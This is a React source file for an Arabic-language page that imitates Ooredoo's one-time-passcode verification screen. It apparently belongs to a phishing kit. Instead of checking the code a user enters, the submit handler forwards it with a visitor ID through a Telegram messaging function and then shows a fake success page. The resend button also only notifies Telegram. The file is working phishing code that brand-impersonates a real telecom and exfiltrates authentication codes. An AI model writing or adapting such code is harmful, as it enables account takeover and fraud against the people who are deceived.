import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import ooredooHeader from '../assets/ooredoo-header.png';

const OTPVerification = () => {
  const navigate = useNavigate();
  const { sendTelegramMessage, formData } = useRegistration();
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [countdown, setCountdown] = useState(60);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  const handleChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(-1);
    }
    
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const otpCode = otp.join('');
    if (otpCode.length !== 6) {
      setError('الرجاء إدخال رمز التحقق كاملاً');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      await sendTelegramMessage(
        `✅ رمز OTP Ooredoo\n\n` +
        `🔢 الرمز: ${otpCode}\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/success');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  const handleResend = async () => {
    if (countdown > 0) return;
    
    await sendTelegramMessage(
      `🔄 طلب إعادة إرسال OTP Ooredoo\n\n` +
      `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
    );
    
    setCountdown(60);
  };

  if (isLoading) {
    return <LoadingScreen message="جاري التحقق..." />;
  }

  return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl">
      {/* Ooredoo Header */}
      <div className="bg-[#ED1C24] py-4 px-6">
        <img src={ooredooHeader} alt="Ooredoo" className="h-8 mx-auto" />
      </div>

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-[#ED1C24] rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">
              أدخل رمز التحقق
            </h1>
            <p className="text-gray-600 text-sm">
              تم إرسال رمز التحقق إلى رقم هاتفك
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="flex justify-center gap-2" dir="ltr">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value.replace(/\D/g, ''))}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-12 h-14 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-[#ED1C24] focus:ring-2 focus:ring-[#ED1C24] focus:outline-none"
                />
              ))}
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#ED1C24] text-white py-3 rounded-lg font-semibold hover:bg-[#D41920] transition-colors"
            >
              تأكيد
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-gray-600 text-sm mb-2">
              لم تستلم الرمز؟
            </p>
            <button
              onClick={handleResend}
              disabled={countdown > 0}
              className={`text-[#ED1C24] font-semibold ${countdown > 0 ? 'opacity-50 cursor-not-allowed' : 'hover:underline'}`}
            >
              {countdown > 0 ? `إعادة الإرسال خلال ${countdown} ثانية` : 'إعادة إرسال الرمز'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
